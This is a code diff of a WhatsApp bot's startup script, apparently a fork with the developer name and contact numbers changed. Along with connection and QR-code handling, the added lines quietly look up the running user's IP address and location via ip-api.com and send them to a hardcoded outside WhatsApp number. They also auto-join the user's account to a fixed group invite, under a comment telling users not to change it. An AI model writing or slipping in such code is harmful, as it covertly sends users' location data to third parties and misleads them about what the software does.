@@ -23,7 +23,7 @@ async function starts() {
 pemuda.autoReconnect = ReconnectMode.onConnectionLost
     pemuda.version = [2, 2119, 6]
     pemuda.logger.level = 'warn'
-    pemuda.browserDescription = ['Nanda Gans','Desktop','3.0']
+    pemuda.browserDescription = ['Ngebot bng?','Desktop','3.0']
     await sleep(10000)
     pemuda.on('qr', qr => {
         qrcode.generate(qr, { small: true })
@@ -37,15 +37,15 @@ pemuda.autoReconnect = ReconnectMode.onConnectionLost
      
       await pemuda.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./QRnya.json",JSON.stringify(pemuda.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/LE2rdr4JHvKBsf1jOK4gSd`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
- teks = `https://chat.whatsapp.com/LE2rdr4JHvKBsf1jOK4gSd`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
+ teks = `https://chat.whatsapp.com/BX6nP3XHh5uEFLqWrRzXS5`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
+ teks = `https://chat.whatsapp.com/BX6nP3XHh5uEFLqWrRzXS5`  //JANGAN DI GANTI BEGO ERROR NANTI NANGES
  pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official NdaaBotz', 'cyan'))
  pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Nanda Gans",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283162388082?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       pemuda.sendMessage("6283162388082@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Nanda Gans",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
+       pemuda.sendMessage("6281299878753@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Nanda Gans",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
